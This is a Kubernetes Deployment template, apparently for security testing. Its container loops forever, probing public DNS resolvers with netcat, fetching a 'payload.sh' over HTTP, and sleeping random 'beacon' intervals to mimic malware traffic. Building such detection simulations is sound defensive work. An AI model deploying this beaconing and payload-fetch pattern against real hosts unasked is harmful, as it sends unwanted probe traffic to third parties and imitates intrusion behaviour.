apiVersion: apps/v1
kind: Deployment
metadata:
  name: security-suspicious-network
  labels:
    app: security-suspicious-network
spec:
  replicas: 1
  selector:
    matchLabels:
      app: security-suspicious-network
  template:
    metadata:
      labels:
        app: security-suspicious-network
    spec:
      containers:
      - name: suspicious-network
        image: suspicious-network:latest
        imagePullPolicy: Never
        command:
        - /bin/sh
        - -c
        - |
          echo "Simulating suspicious network behaviour..."

          TARGETS="1.1.1.1 8.8.8.8 9.9.9.9"

          while true; do

            # Random target every iteration
            TARGET=$(echo $TARGETS | tr ' ' '\n' | shuf -n1)

            echo "Connecting to $TARGET"

            # Suspicious outbound probes
            nc -z -v -w 2 $TARGET {{PORT_1}} || true
            nc -z -v -w 2 $TARGET {{PORT_2}} || true

            # Simulated payload fetch
            curl -s --max-time 2 http://$TARGET/payload.sh || true

            # Randomized beacon interval
            sleep $((RANDOM % {{CONNECT_INTERVAL}} + 1))

          done
      resources:
        requests:
          memory: "64Mi"
        limits:
          memory: "128Mi"
